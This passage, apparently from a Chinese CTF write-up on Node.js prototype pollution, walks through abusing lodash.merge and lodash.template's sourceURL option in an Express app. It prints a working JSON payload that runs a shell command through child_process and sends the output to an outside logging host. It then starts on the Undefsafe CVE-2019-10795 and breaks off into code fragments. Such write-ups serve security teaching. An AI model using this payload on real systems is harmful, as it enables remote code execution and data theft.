            return callback(null, rendered)
        })
    })
    app.set('views', './views')
    app.set('view engine', 'ejs')
    app.all('/', (req, res) => {
        let data = req.session.data || {language: [], category: []}
        if (req.method == 'POST') {
            data = lodash.merge(data, req.body)
            req.session.data = data
        }
        res.render('index', {
            language: data.language, 
            category: data.category
        })
    })
    app.listen(3000, () => console.log(`Example app listening on port 3000!`))
比较重要的代码如下
    // ...
    const lodash = require('lodash')
    // ...
    app.engine('ejs', function (filePath, options, callback) { 
    // define the template engine
        fs.readFile(filePath, (err, content) => {
            if (err) return callback(new Error(err))
            let compiled = lodash.template(content)
            let rendered = compiled({...options})
            return callback(null, rendered)
        })
    })
    //...
    app.all('/', (req, res) => {
        let data = req.session.data || {language: [], category: []}
        if (req.method == 'POST') {
            data = lodash.merge(data, req.body)
            req.session.data = data
        }
        res.render('index', {
            language: data.language, 
            category: data.category
        })
    })
其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。
问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞，会直接将注入原型的属性的值写去最底层的object。我们需要找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。
在template函数中我们可以找到利用点
    var result = attempt(function() {
      return Function(importsKeys, sourceURL + 'return ' + source)
        .apply(undefined, importsValues);
    });
看下`sourceURL`
**option** 是在模板引擎中渲染的值。这里读的是 **sourceURL** 属性的值，我们可以通过添加一个 **sourceURL**
属性，修改它的值，通过js原型链污染在function中达到执行js的目的，模板：
    new Function("","//# sourceURL='xxx'\r\n CODE \r\n")();
因为require不是全局的，他只存在于当前的模块范围，但是`new function`是在新的领域运行的，所以我们想利用的话要先将它引用过来
    {"__proto__":{"sourceURL":"xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://onsdtb.ceye.io/${result}`);req.end();\r\n"}}
## Undefsafe 模块原型链污染（CVE-2019-10795）
Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（ {
                    if (err) {
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                });
            }
            res.send('OK');
            res.end();
        })
    app.use(function(req, res, next) {
      res.status(404).send('Sorry cant find that!');
    });
    app.use(function(err, req, res, next) {